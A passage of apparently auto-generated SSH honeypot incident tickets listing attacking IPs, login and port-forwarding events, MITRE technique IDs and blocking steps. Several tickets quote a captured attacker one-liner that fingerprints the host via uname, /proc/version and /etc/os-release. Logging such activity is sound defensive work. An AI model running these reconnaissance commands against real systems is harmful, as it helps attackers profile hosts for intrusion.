| Field | Detail |
|---|---|
| **Source IP** | `217.24.185[.]98` |
| **First Seen** | 2026-07-26 07:21 |
| **Last Seen** | 2026-07-26 07:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:21:14` | `cowrie.session.connect` |
| `2026-07-26 07:21:15` | `cowrie.client.version` |
| `2026-07-26 07:21:15` | `cowrie.client.kex` |
| `2026-07-26 07:21:16` | `cowrie.login.success` |
| `2026-07-26 07:21:16` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:21:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.24.185[.]98` to AbuseIPDB if not already reported
- [ ] Block `217.24.185[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b462aee330

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:22 |
| **Last Seen** | 2026-07-26 07:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:22:45` | `cowrie.session.connect` |
| `2026-07-26 07:22:45` | `cowrie.client.version` |
| `2026-07-26 07:22:45` | `cowrie.client.kex` |
| `2026-07-26 07:22:47` | `cowrie.login.success` |
| `2026-07-26 07:22:48` | `cowrie.session.params` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.success` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.command.input` |
| `2026-07-26 07:22:48` | `cowrie.log.closed` |
| `2026-07-26 07:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b7194a99029

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-07-26 07:24 |
| **Last Seen** | 2026-07-26 07:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:24:22` | `cowrie.session.connect` |
| `2026-07-26 07:24:22` | `cowrie.client.version` |
| `2026-07-26 07:24:22` | `cowrie.client.kex` |
| `2026-07-26 07:24:24` | `cowrie.login.success` |
| `2026-07-26 07:24:24` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72922417bc56

| Field | Detail |
|---|---|
| **Source IP** | `211.223.41[.]90` |
| **First Seen** | 2026-07-26 07:24 |
| **Last Seen** | 2026-07-26 07:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:24:34` | `cowrie.session.connect` |
| `2026-07-26 07:24:35` | `cowrie.client.version` |
| `2026-07-26 07:24:35` | `cowrie.client.kex` |
| `2026-07-26 07:24:37` | `cowrie.login.success` |
| `2026-07-26 07:24:37` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:24:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.223.41[.]90` to AbuseIPDB if not already reported
- [ ] Block `211.223.41[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8f56922c2f5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:24 |
| **Last Seen** | 2026-07-26 07:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:24:36` | `cowrie.session.connect` |
| `2026-07-26 07:24:37` | `cowrie.client.version` |
| `2026-07-26 07:24:37` | `cowrie.client.kex` |
| `2026-07-26 07:24:38` | `cowrie.login.success` |
| `2026-07-26 07:24:39` | `cowrie.session.params` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.success` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.command.input` |
| `2026-07-26 07:24:39` | `cowrie.log.closed` |
| `2026-07-26 07:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6500d50427c4

| Field | Detail |
|---|---|
| **Source IP** | `194.85.235[.]99` |
| **First Seen** | 2026-07-26 07:25 |
| **Last Seen** | 2026-07-26 07:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:25:17` | `cowrie.session.connect` |
| `2026-07-26 07:25:19` | `cowrie.client.version` |
| `2026-07-26 07:25:19` | `cowrie.client.kex` |
| `2026-07-26 07:25:25` | `cowrie.login.success` |
| `2026-07-26 07:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.85.235[.]99` to AbuseIPDB if not already reported
- [ ] Block `194.85.235[.]99` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05460836b2c2

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-26 07:25 |
| **Last Seen** | 2026-07-26 07:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:25:27` | `cowrie.session.connect` |
| `2026-07-26 07:25:27` | `cowrie.client.version` |
| `2026-07-26 07:25:27` | `cowrie.client.kex` |
| `2026-07-26 07:25:27` | `cowrie.login.success` |
| `2026-07-26 07:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92a8cca6177b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:26 |
| **Last Seen** | 2026-07-26 07:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:26:28` | `cowrie.session.connect` |
| `2026-07-26 07:26:28` | `cowrie.client.version` |
| `2026-07-26 07:26:28` | `cowrie.client.kex` |
| `2026-07-26 07:26:29` | `cowrie.login.success` |
| `2026-07-26 07:26:30` | `cowrie.session.params` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.success` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:30` | `cowrie.command.input` |
| `2026-07-26 07:26:31` | `cowrie.log.closed` |
| `2026-07-26 07:26:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-821334a09fdb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:28 |
| **Last Seen** | 2026-07-26 07:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:28:25` | `cowrie.session.connect` |
| `2026-07-26 07:28:25` | `cowrie.client.version` |
| `2026-07-26 07:28:25` | `cowrie.client.kex` |
| `2026-07-26 07:28:27` | `cowrie.login.success` |
| `2026-07-26 07:28:28` | `cowrie.session.params` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.success` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:28` | `cowrie.command.input` |
| `2026-07-26 07:28:29` | `cowrie.log.closed` |
| `2026-07-26 07:28:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae1b7c3f7b7

| Field | Detail |
|---|---|
| **Source IP** | `180.188.253[.]150` |
| **First Seen** | 2026-07-26 07:28 |
| **Last Seen** | 2026-07-26 07:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:28:56` | `cowrie.session.connect` |
| `2026-07-26 07:28:57` | `cowrie.client.version` |
| `2026-07-26 07:28:57` | `cowrie.client.kex` |
| `2026-07-26 07:28:59` | `cowrie.login.success` |
| `2026-07-26 07:29:00` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.188.253[.]150` to AbuseIPDB if not already reported
- [ ] Block `180.188.253[.]150` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d03ac0e92e

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-26 07:29 |
| **Last Seen** | 2026-07-26 07:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:29:05` | `cowrie.session.connect` |
| `2026-07-26 07:29:05` | `cowrie.client.version` |
| `2026-07-26 07:29:05` | `cowrie.client.kex` |
| `2026-07-26 07:29:07` | `cowrie.login.success` |
| `2026-07-26 07:29:07` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18fc48dedfa7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:31 |
| **Last Seen** | 2026-07-26 07:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:31:50` | `cowrie.session.connect` |
| `2026-07-26 07:31:51` | `cowrie.client.version` |
| `2026-07-26 07:31:51` | `cowrie.client.kex` |
| `2026-07-26 07:31:53` | `cowrie.login.success` |
| `2026-07-26 07:31:54` | `cowrie.session.params` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.success` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.command.input` |
| `2026-07-26 07:31:54` | `cowrie.log.closed` |
| `2026-07-26 07:31:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-828bffe6cedb

| Field | Detail |
|---|---|
| **Source IP** | `119.160.166[.]237` |
| **First Seen** | 2026-07-26 07:33 |
| **Last Seen** | 2026-07-26 07:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:33:16` | `cowrie.session.connect` |
| `2026-07-26 07:33:16` | `cowrie.client.version` |
| `2026-07-26 07:33:16` | `cowrie.client.kex` |
| `2026-07-26 07:33:19` | `cowrie.login.success` |
| `2026-07-26 07:33:20` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.160.166[.]237` to AbuseIPDB if not already reported
- [ ] Block `119.160.166[.]237` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-309d185f39b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:33 |
| **Last Seen** | 2026-07-26 07:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:33:33` | `cowrie.session.connect` |
| `2026-07-26 07:33:34` | `cowrie.client.version` |
| `2026-07-26 07:33:34` | `cowrie.client.kex` |
| `2026-07-26 07:33:36` | `cowrie.login.success` |
| `2026-07-26 07:33:37` | `cowrie.session.params` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.success` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:37` | `cowrie.command.input` |
| `2026-07-26 07:33:38` | `cowrie.log.closed` |
| `2026-07-26 07:33:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3262b0470d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:35 |
| **Last Seen** | 2026-07-26 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:35:14` | `cowrie.session.connect` |
| `2026-07-26 07:35:14` | `cowrie.client.version` |
| `2026-07-26 07:35:14` | `cowrie.client.kex` |
| `2026-07-26 07:35:16` | `cowrie.login.success` |
| `2026-07-26 07:35:18` | `cowrie.session.params` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.success` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.command.input` |
| `2026-07-26 07:35:18` | `cowrie.log.closed` |
| `2026-07-26 07:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2dcb41ddfc

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-26 07:35 |
| **Last Seen** | 2026-07-26 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:35:48` | `cowrie.session.connect` |
| `2026-07-26 07:35:48` | `cowrie.client.version` |
| `2026-07-26 07:35:49` | `cowrie.client.kex` |
| `2026-07-26 07:35:49` | `cowrie.login.success` |
| `2026-07-26 07:35:49` | `cowrie.direct-tcpip.request` |
| `2026-07-26 07:35:49` | `cowrie.direct-tcpip.data` |
| `2026-07-26 07:35:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d94211ebba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-26 07:36 |
| **Last Seen** | 2026-07-26 07:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 07:36:54` | `cowrie.session.connect` |
| `2026-07-26 07:36:55` | `cowrie.client.version` |
| `2026-07-26 07:36:55` | `cowrie.client.kex` |
| `2026-07-26 07:36:57` | `cowrie.login.success` |
| `2026-07-26 07:36:58` | `cowrie.session.params` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.success` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:58` | `cowrie.command.input` |
| `2026-07-26 07:36:59` | `cowrie.log.closed` |
| `2026-07-26 07:36:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b2af47aa96f

| Field | Detail |
|---|---|
